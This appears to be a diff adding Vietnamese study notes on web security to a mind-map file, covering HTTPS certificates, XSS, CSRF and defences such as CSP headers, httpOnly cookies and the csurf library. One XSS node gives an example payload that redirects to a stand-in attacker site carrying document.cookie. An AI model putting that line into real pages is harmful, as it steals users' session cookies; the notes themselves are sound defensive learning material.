@@ -447,6 +447,58 @@
 </node>
 </node>
 </node>
+<node CREATED="1565622899047" ID="ID_58895001" MODIFIED="1565704730332" TEXT="https">
+<node CREATED="1565622901996" ID="ID_1258722396" MODIFIED="1565622929619" TEXT="SSL/TLS certificates">
+<node CREATED="1565622985819" ID="ID_693285718" MODIFIED="1565623009461" TEXT="M&#xe3; h&#xf3;a d&#x1eef; li&#x1ec7;u chuy&#x1ec1;n gi&#x1eef;a client v&#xe0; server"/>
+</node>
+<node CREATED="1565622931832" ID="ID_1604313460" MODIFIED="1565622931832" TEXT="">
+<node CREATED="1565622933406" ID="ID_1958722595" MODIFIED="1565622965265" TEXT="https://letsenscrypt.org"/>
+<node CREATED="1565622965542" ID="ID_1825910785" MODIFIED="1565622983450" TEXT="https://cloudflare.com"/>
+</node>
+</node>
+<node CREATED="1565704731302" ID="ID_372585422" MODIFIED="1565704748578" TEXT="XSS/CSRF">
+<node CREATED="1565704780970" ID="ID_1319787666" MODIFIED="1565704909171" TEXT="Cross site scripting">
+<node CREATED="1565704909153" ID="ID_1114756951" MODIFIED="1565704913009" TEXT="is">
+<node CREATED="1565704797024" ID="ID_1003958400" MODIFIED="1565704881865" TEXT="Ch&#xe8;n &#x111;o&#x1ea1;n m&#xe3; v&#xe0;o c&#xe1;c b&#xe0;i post tr&#xea;n blog"/>
+<node CREATED="1565704914946" ID="ID_1257191028" MODIFIED="1565704971172" TEXT="window.location = &quot;webisteHacker.com?cookie=&quot;+document.cookie">
+<node CREATED="1565704972184" ID="ID_1108682053" MODIFIED="1565705002091" TEXT="ng&#x1b0;&#x1edd;i d&#xf9;ng b&#x1ecb; &#x111;&#xe1;nh c&#x1eaf;p cookie"/>
+</node>
+</node>
+<node CREATED="1565704899823" ID="ID_1811467690" MODIFIED="1565705010077" TEXT="fix">
+<node CREATED="1565705030910" ID="ID_287417988" MODIFIED="1565705072248" TEXT="Ch&#x1eb7;n kh&#xf4;ng cho ph&#xe9;p ch&#xe8;n m&#xe3; v&#xf2;a database"/>
+</node>
+</node>
+<node CREATED="1565705073527" ID="ID_357207481" MODIFIED="1565705102547" TEXT="Cross site request forgery">
+<node CREATED="1565705103491" ID="ID_650944059" MODIFIED="1565705105729" TEXT="is">
+<node COLOR="#338800" CREATED="1565705120120" ID="ID_1125659653" MODIFIED="1565705311646" TEXT="Victim b&#x1ecb; l&#x1eeb;a th&#x1ef1;c hi&#x1ec7;n h&#xe0;nh v&#x1ecb; l&#x1eeb;a &#x111;&#x1ea3;o">
+<node CREATED="1565705313562" ID="ID_1152296722" MODIFIED="1565705351782" TEXT="Chuy&#x1ec1;n ti&#x1ec1;n khi clik v&#xe0;o link m&#xe0; kh&#xf4;ng bi&#x1ebf;t"/>
+<node CREATED="1565705352564" ID="ID_1369443660" MODIFIED="1565705376128" TEXT="link g&#x1ecd;i API chuy&#x1ec3;n ti&#x1ec1;n ra kh&#x1ecf;i t&#xe0;i kho&#x1ea3;n,..."/>
+</node>
+</node>
+<node CREATED="1565705408235" ID="ID_1082765058" MODIFIED="1565705414590" TEXT="htttpbin.org"/>
+</node>
+<node CREATED="1565705388009" ID="ID_1246093591" MODIFIED="1565705396631" TEXT="resolutions">
+<node CREATED="1565705397560" ID="ID_1440178001" MODIFIED="1565705509771" TEXT="B&#x1ea3;o &#x111;&#x1ea3;m gi&#x1eef; li&#x1ec7;u &#x111;&#x1ea7;u v&#xe0;o"/>
+<node CREATED="1565705513572" ID="ID_808395052" MODIFIED="1565705520172" TEXT="set header">
+<node CREATED="1565705521140" ID="ID_1577179612" MODIFIED="1565705617556" TEXT="res.set({Content-security-policy: &quot;script-src &apos;self&apos; &apos;https://apis.google.com&apos; &quot;})">
+<node CREATED="1565705618107" ID="ID_62065411" MODIFIED="1565705651194" TEXT="Ch&#x1ec9; cho ph&#xe9;p ch&#x1ea1;y sript tr&#xea;n">
+<node CREATED="1565705651726" ID="ID_1589915608" MODIFIED="1565705661480" TEXT="website &#x111;&#xf3;"/>
+<node CREATED="1565705657779" ID="ID_1053476632" MODIFIED="1565705680858" TEXT="google api"/>
+</node>
+</node>
+<node CREATED="1565705684115" ID="ID_1721224" MODIFIED="1565705764164" TEXT="res.cookie{name, value, {httpOnly: true, secure: true})">
+<node CREATED="1565705765598" ID="ID_1357932103" MODIFIED="1565705787435" TEXT="Ch&#x1ec9; cho ph&#xe9;p set cookie ph&#xed;a server"/>
+</node>
+</node>
+<node CREATED="1565705790504" ID="ID_888246889" MODIFIED="1565705804735" TEXT="Kh&#xf4;ng s&#x1eed;a d&#x1ee5;ng function">
+<node CREATED="1565705805702" ID="ID_336183327" MODIFIED="1565705809315" TEXT="eval()"/>
+<node CREATED="1565705809568" ID="ID_495645697" MODIFIED="1565705824008" TEXT="document.write()"/>
+</node>
+<node CREATED="1565705824723" ID="ID_1801974227" MODIFIED="1565705845971" TEXT="D&#xf9;ng th&#x1b0; vi&#x1ec7;n b&#xea;n th&#x1ee9; 3">
+<node CREATED="1565705846925" ID="ID_195315612" MODIFIED="1565705865862" TEXT="npm install --save csurf"/>
+</node>
+</node>
+</node>
 </node>
 <node CREATED="1565405749119" ID="ID_1165777626" MODIFIED="1565511053746" POSITION="left" TEXT="SSR (server side renderting)">
 <node CREATED="1565405807316" ID="ID_537246765" MODIFIED="1565405820376" TEXT="lib">
